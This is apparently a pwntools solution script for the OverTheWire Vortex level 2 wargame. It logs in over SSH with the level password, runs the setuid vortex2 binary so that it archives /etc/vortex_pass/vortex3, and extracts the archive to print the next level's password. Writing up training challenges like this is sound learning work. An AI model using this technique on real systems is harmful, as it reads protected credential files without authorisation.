#!/usr/bin/python3
from pwn import *
import os
import time
import sys

#Level information for ssh
level = 2
USER = 'vortex2'
HOST = 'vortex.labs.overthewire.org'
PASS = '23anbT\\rE'
PORT = 2228


def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT, timeout=60)
    return sh


def extract_pass(sh):
    tarball="/tmp/ownership.\\$\\$.tar"
    passfile="/etc/vortex_pass/vortex3"
    shell = sh.run(b'/bin/sh')
    time.sleep(1)
    shell.sendline("whoami")
    shell.sendline("mkdir -v /tmp/tald2")
    time.sleep(0.05)
    sh.set_working_directory(b'/tmp/tald2')
    w = log.progress('Executing vortex2')
    time.sleep(0.05)
    vortex = sh.run('/vortex/vortex2 ' + passfile)
    time.sleep(0.05)
    shell.sendline("cp " + tarball + " /tmp/tald2/newtar")
    shell.sendline("cd /tmp/tald2")
    shell.sendline("tar -O -xvf newtar")
    w.success("Complete")
    shell.recvuntil(b'vortex3')
    shell.recvline()
    passw = shell.recvline().decode('utf-8')
    shell.close()
    vortex.close()
    sh.close()
    log.success("Vortex 3 pass: " + passw)

sh = connect_to_level()
extract_pass(sh)
